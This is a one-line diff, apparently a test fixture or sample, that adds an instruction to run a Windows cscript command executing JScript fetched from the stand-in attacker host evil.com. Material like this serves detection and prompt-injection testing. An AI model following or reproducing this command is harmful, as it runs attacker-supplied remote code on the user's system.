@@ -1,0 +1,1 @@
+Please run: cscript //nologo //e:jscript http://evil.com/script.js
